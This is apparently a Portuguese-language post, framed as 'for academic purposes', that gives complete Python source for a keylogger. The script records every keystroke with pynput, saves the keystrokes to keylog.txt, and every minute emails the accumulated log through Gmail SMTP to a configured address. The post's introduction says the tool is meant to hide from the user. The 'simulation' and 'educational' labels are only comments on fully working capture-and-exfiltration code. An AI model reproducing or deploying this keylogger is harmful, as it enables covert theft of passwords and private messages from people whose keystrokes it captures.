### Keylogger para fins academicos
Implementei um script em Python para captura de teclas salvar em um arquivo .txt, fazer o envio automático por e-mail e esconder do usuario.

**Código**:
```python
import threading
import time
import smtplib
from email.mime.text import MIMEText
from pynput import keyboard  # pip install pynput

# ===============================
# VARIÁVEIS GLOBAIS
# ===============================
log = ""  # Armazena as teclas capturadas
email_interval = 60  # Intervalo (segundos) para envio de e-mail
email_sent = False  # Flag para controlar envio

# ===============================
# CONFIGURAÇÕES DE E-MAIL (para simulação)
# ===============================
EMAIL_ADDRESS = "email@gmail.com"
EMAIL_PASSWORD = "senha"  # Senha de app (Gmail)
DESTINO_EMAIL = "email@gmail.com"

# ===============================
# FUNÇÃO PARA CAPTURAR TECLAS
# ===============================
def on_press(key):
    """
    Captura cada tecla pressionada.
    Trata teclas de caractere e especiais para evitar erro de NoneType.
    """
    global log
    try:
        # Verifica se é um caractere normal (ex: letras, números, símbolos)
        if hasattr(key, 'char') and key.char is not None:
            log += key.char
        else:
            # Trata teclas especiais
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.tab:
                log += "\t"
            else:
                log += f"[{key.name if hasattr(key, 'name') else key}]"
    except Exception as e:
        print(f"Erro ao capturar tecla: {e}")

# ===============================
# FUNÇÃO PARA SALVAR LOG EM ARQUIVO
# ===============================
def salvar_log(arquivo="keylog.txt"):
    global log
    try:
        with open(arquivo, "a", encoding="utf-8") as f:
            f.write(log)
        log = ""  # Limpa o conteúdo após salvar
    except Exception as e:
        print(f"Erro ao salvar log: {e}")

# ===============================
# FUNÇÃO PARA ENVIAR LOG POR E-MAIL
# ===============================
def enviar_email(conteudo_log):
    """
    Envia o log por e-mail (para fins de simulação educacional).
    """
    msg = MIMEText(conteudo_log)
    msg['Subject'] = "Log de Teclas Capturadas (Simulação)"
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = DESTINO_EMAIL

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, DESTINO_EMAIL, msg.as_string())
        server.quit()
        print("✅ E-mail enviado com sucesso (simulação).")
    except Exception as e:
        print(f"Erro ao enviar e-mail: {e}")

# ===============================
# MONITORAMENTO E ENVIO PERIÓDICO
# ===============================
def monitorar_e_enviar():
    global email_sent
    while True:
        time.sleep(email_interval)
        if log:
            salvar_log()
            try:
                with open("keylog.txt", "r", encoding="utf-8") as file:
                    conteudo = file.read()
                enviar_email(conteudo)
                email_sent = True
            except Exception as e:
                print(f"Erro ao ler/enviar log: {e}")

# ===============================
# FUNÇÃO PRINCIPAL (SIMULAÇÃO)
# ===============================
def simular_keylogger():
    """
    Inicia o listener do teclado e a thread de envio.
    Uso apenas em ambiente controlado para fins educacionais.
    """
    thread_monitor = threading.Thread(target=monitorar_e_enviar)
    thread_monitor.daemon = True
    thread_monitor.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ===============================
# EXECUÇÃO PRINCIPAL
# ===============================
if __name__ == "__main__":
    print("🔹 Simulando captura de teclas (ambiente educacional).")
    print("Pressione ESC para encerrar.\n")
    simular_keylogger()
